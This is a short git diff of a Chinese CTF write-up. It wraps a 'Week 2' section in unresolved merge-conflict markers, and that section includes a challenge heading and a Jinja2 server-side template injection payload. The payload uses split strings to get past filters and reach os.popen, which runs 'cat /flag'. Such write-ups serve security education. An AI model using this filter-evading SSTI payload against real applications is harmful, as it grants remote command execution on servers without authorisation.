@@ -274,6 +274,7 @@ Content-Disposition: form-data; name="say"
 然后将改后的 `Cookie` 放入请求头，等待一会（优美的）剧情，即可获得 `flag`
 
 
+<<<<<<< HEAD
 # Week 2
 
 ## 你能在一秒内打出八句英文吗
@@ -304,6 +305,14 @@ exp:
 ```jinja2
 {%print(lipsum['_''_glob''als_''_']['os']['pop''en']('cat /flag').read())%}
 ```
+=======
+
+
+
+
+
+
+>>>>>>> 619f3d5e50f3dea0fa5682727beff77050e6fb7d
 
 
 
